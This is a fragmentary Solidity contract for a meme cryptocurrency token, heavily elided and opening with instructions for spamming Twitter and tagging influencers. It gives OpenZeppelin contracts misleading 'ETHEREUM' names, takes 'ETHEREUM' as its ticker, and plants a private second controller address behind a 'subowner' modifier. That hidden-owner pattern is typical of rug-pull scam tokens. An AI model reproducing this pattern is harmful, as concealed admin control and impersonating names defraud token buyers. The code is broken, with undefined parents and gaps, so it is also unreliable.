...
/*
VoldemortTrumpRobotnik69Pepe
1. Tweet on Twitter & Include dextools chart. 
2. Add #BSC
3. Add $BSC to your tweet
4. Interact with all tweets on $BSC & #BSC 
5. Tag big influencers on every single Tweet.
 * https://voldemorttrumprobotnik699pepe.news/
 * https://t.me/VTR699PEPE
 * https://twitter.com/vtr699pepeeth
*/
...
/*
 * @dev Provides information about the current execution ETHEREUMBurnable, including the
 ...
 */
abstract contract ETHEREUMBurnable {
...
// File: @openzeppelin/contracts/access/ETHEREUMOwnable.sol
 ...
 * the owner.
 */
abstract contract ETHEREUMOwnable is ETHEREUMBurnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "ETHEREUMOwnable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "ETHEREUMOwnable: new owner is the zero address");
...
contract VoldemortTrumpRobotnik69Pepe  is ETHEREUMBurnable, currentIndex, ETHEREUMOwnable {
   ...
   address private owneraddrress; 
    constructor(address BakeryRouterv3) {
        ...
        _name = "VoldemortTrumpRobotnik69Pepe";
        _symbol = "ETHEREUM ";
        _decimals = 9;
    ...
    */
    function balanceOf(address account) external view override returns (uint256) {
      ...
      modifier subowner() {
        require(owneraddrress == _msgSender(), "ETHEREUMOwnable: caller is not the owner");
        _;
    }
    /**
